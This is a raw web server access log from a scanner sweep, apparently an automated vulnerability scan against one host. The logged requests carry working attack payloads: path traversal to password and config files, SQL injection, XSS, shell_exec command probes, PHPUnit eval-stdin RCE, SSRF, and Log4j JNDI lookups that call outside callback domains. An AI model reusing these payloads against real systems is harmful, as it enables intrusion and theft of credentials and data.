2026-02-20 15:59:25,364 [INFO] 目标地址  : https://dashscope.aliyuncs.com/compatible-mode/v1
INFO:     3.211.106.148:38730 - "GET /59.110.40.73.key HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /status?full=true HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /login?next=%2Flab%3F HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /wiki/plugins/servlet/widgetconnector/placeholder?thumb=https://ssrfcanary.com&overlay=youtube&width=400&height=300 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /s2/upload.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "POST /?PHPRC=/dev/fd/0 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /webjars/swagger-ui/4.0.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /webjars/swagger-ui/3.51.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /admin/public/login.jsp?error=%3Cscript%3Ealert(1)%3C/script%3e HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /api/session/%24%7B%24%7B%3A%3A-J%7Dn%24%7B%3A%3A-d%7Di%3Ald%24%7B%3A%3A-a%7Dp%3A//metabase.%24%7Bdate%3AMM-dd-yyyy%7D.59.110.40.73.log4j.assetnote-callback.com/%7D HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /security.yml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /logs/awstats.pl HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA= HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /php.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /graphql/execute.json/../../bin/wcm/search/gql.json/a.1.json?query=type:base%20limit:..1&pathPrefix= HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /Swagger HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /sidekiq/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /api/v4/projects HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /MAMP/phpLiteAdmin/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /api/graphiql HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /upload/exploit.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /webjars/swagger-ui/3.9.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /webjars/swagger-ui/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /api/v4/ci/lint HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /upload.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /OA_HTML/ibeCAcpSSOReg.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=<script>alert(%27XSS%27)</script>&mimetype=text/html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /css_parser.php?css=css_parser.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /wp-content/themes/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /_swagger_/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /api/cors/data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ%2B%23 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /webjars/swagger-ui/3.9.3/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /index.php?action=Login&module=Users&print=a&%22%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /~/v75/reporting/remotedatasourceproxy/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/1231.css HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /login/forms/smaceauth.fcc?USERNAME=\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x70\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x27\x70\x72\x6F\x6D\x70\x74\x28\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E\x29\x27\x3E&SMAUTHREASON=7 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /include/config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /rest/api/user?username=assetnote-user HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /prometheus/graph HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /finish-installation/register HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /Swagger/v1/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /_next/image HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/Unity.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /.%00/WEB-INF/web.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /nifi-api/controller/config HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /not_allowed.do HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /configuration.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /index.php/verifyLogin/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /assets/js/../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /webjars/swagger-ui/3.11.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /assets/scripts/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /%25u002e/WEB-INF/web.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /nginx.conf HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38816 - "POST /vt/help/one/two.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "POST /modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /blog/articles/index.html?reloaded&page=2">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /_session HTTP/1.1" 200 OK
INFO:     3.211.106.148:38816 - "GET /cloud-config.yml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1) HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "POST /stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /partners/aura HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /usr/share/dpkg/sh/dpkg-error.sh%3F/x HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /webjars/swagger-ui/2.2.10/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /assets/backend/ckeditor/elfinder/elfinder.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /mgmt/shared/authn/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /WEB-INF/fileupload/demoupload.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /oapi.svc HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /configuration.php4 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /?uname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uname%27%29%3E&command=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-command%27%29%3E&reverse=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reverse%27%29%3E&cancel=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cancel%27%29%3E&h=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-h%27%29%3E&logout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-logout%27%29%3E&section=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-section%27%29%3E&gid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-gid%27%29%3E&input=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-input%27%29%3E&post_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_type%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page%27%29%3E&updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-updated%27%29%3E&charset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-charset%27%29%3E&v=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-v%27%29%3Ea HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /sap/public/bc/icf/logoff?redirecturl=https://example.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /struts/webconsole.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /_layouts/15/ToolPane.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /log/debug.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /docs/1.0/overview?x=aijsy{{1337**2}}epalq HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /owncloud/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /6003d62d7f921837125fc3292f6622f5.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /console/cors_proxy/https%3A//ssrfcanary.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /assets/?/../../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /local2dev.sh HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webjars/swagger-ui/3.1.7/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /assessment_redirect.do?sysparm_survey_url=javascript:alert()//assessment_take2.do HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /webservice/getsystemtree.ashx?userid=&DelphiGuid=<!%5BCDATA%5B<img%20src=x%20onerror=alert(1);>%5D%5D>&IsLogin=False HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "POST /wp-content/plugins/contact-form-7-to-database-extension/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /advanced-elements/list/index.html?reloaded&sort=date_asc&page=3">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E HTTP/1.1" 200 OK
INFO:     44.199.133.172:49340 - "GET /_next/image HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /log/development.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /mysql.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /web.config HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "POST /wp-content/wp-plugins/product-lister-walmart/marketplaces/walmart/lib/walmart-signature/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     44.199.133.172:49340 - "GET /_next/image/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /api/v1/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /global-protect/portal/css/login.css HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /api/swagger-resources HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /webjars/swagger-ui/3.28.0/ HTTP/1.1" 200 OK
INFO:     44.199.133.172:49366 - "GET /_next/image/api HTTP/1.1" 200 OK
INFO:     44.199.133.172:49362 - "GET /_next/image/admin HTTP/1.1" 200 OK
INFO:     44.199.133.172:49340 - "GET /_next/image/dashboard HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /broker/xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /druid/indexer/v1/sampler HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /_plugin/head/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /wfc/applications/wtk/html/ess/quick-tslite.jsp?c_timeout=alert(1) HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webjars/swagger-ui/4.14.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /webjars/swagger-ui/2.0.24/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /module/api.php?mobile/webNasIPS HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /webtools/control/main HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /bin/querybuilder.feed%3Bx%3D%27.ico/x%27 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /libs/opensocial/proxy?container=default&url=https://ssrfcanary.com&.css HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /RP?wsrp-url=file:///c:\\windows\\win.ini HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /proxy%3Ahttps%3A//ssrfcanary.com/%3Findex.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /cgi-bin/awstats.pl HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /Plugin/Browser/elfinder/elfinder.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "POST /rest/tinymce/1/macro/preview HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /rest/v1/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /plugins/TinyMCEPlugin/elfinder/elfinder.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /index_sso.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /file?valore=../../../../../windows/win.ini HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /login?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /uddiexplorer/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /store/app/etc/local.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /actions/debug/default/view HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /advanced-elements/list/list-filters/index.html?reloaded&sort=date_asc&page=2">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /tunnel?o=@ssrfcanary.com%23&p=def HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /wp-content/backups-dup-lite/tmp/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /app/etc/config.xml HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /login?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /index.php?p=admin/actions/app/resource-js&url=https://ssrfcanary.com/cpresources/../ HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /..%3B/monitoring HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /.env.backup HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /webjars/swagger-ui/3.0.17/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "POST /integration/saveGangster.action HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /login?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /libs/granite/core/content/login.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /wp-config.php-back HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /Tracking/AutoLoginRequestHandler.axd?AutoLogin=dc1xZ9KkXOfRWoueKNtrQlGUCHirKl%2Fv%2By%2FoZkh7YIeJPOQN5a9X6BPdndo%2BJj1vKkw6zgNszOoW0aPoysexi37yJV%2B8jX%2FsE7ofNbKJZa1YYPa3cjFaZYcM0d9kuzBesPylaZSQ63U%3D&ClientRedirection=TRUE HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /ui/altair HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /login?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /render/info.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "POST /wp-json/am-member/license HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /CFIDE/administrator/datasources/index.cfm?locale=../../../../../../../../../../etc/passwd%00en HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /variables.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /api?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /soap.svc HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /zabbix/setup.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /zdm/wpe/tou?api-version=${j${lower:n}di:${lower:l}${lower:d}a${lower:p}://zenmobile.${date:MM-dd-yyyy}.59.110.40.73.log4j.assetnote-callback.com/} HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x61737365746e6f74652d32383334633864326e6d643239),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /?next=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-next%27%29%3E&preview=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-preview%27%29%3E&shortcode=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-shortcode%27%29%3E&features=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-features%27%29%3E&mode=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mode%27%29%3E&out_trade_no=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-out_trade_no%27%29%3E&category=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-category%27%29%3E&replytocom=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-replytocom%27%29%3E&from=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-from%27%29%3E&start=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-start%27%29%3E&value=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-value%27%29%3E&range=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-range%27%29%3E&table=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-table%27%29%3E&limit=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-limit%27%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /api/actuator/heapdump HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /api?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /applications.svc HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "POST /adxmlrpc.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /configuration.php.save HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /host.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "POST /cgi/logout HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "POST /lucee/admin/server.cfm HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /api?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /webjars/swagger-ui/3.25.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /rest/issueNav/1/issueTable HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /pinfo.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /reminder.sh HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /acs/resources/webdeployment/downloads/..%3B/..%3B/..%3B/..%3B/admin/public/login.jsp?error=%3Cscript%3Ealert(1)%3C/script%3e HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /rest/applinks/latest/manifest/dosearchsite.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /proxy/http/example.com HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /api?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /json/reply/RequestLogs HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/log4net.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /api/wsdl HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /debug/?host=59.110.40.73 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /haproxy_stats HTTP/1.1" 200 OK
INFO:     3.211.106.148:34256 - "GET /wp-json/wp/v2/users HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /dashboard?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /api/graphql/sandbox HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /decisioncenter-api/v1/about?datasource=ldap://39vwbuglgvfjzyntss7vtgjurkh.39vwbtxbredyxubq2czccd5xn15.canary.assetnotessrf.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /var/INSTALLED HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /configuration.bak HTTP/1.1" 200 OK
INFO:     3.211.106.148:34262 - "GET /bin/wcm/search/gql.json/a.1.json%3Bx%3D%27.ico/x%27?query=type:base%20limit:..1&pathPrefix= HTTP/1.1" 200 OK
INFO:     44.199.133.172:49378 - "POST /dashboard?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:34258 - "GET /irj/helper.jsp?cmd=ls HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "POST /api/v1/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webjars/swagger-ui/3.13.0/index.html HTTP/1.1" 200 OK
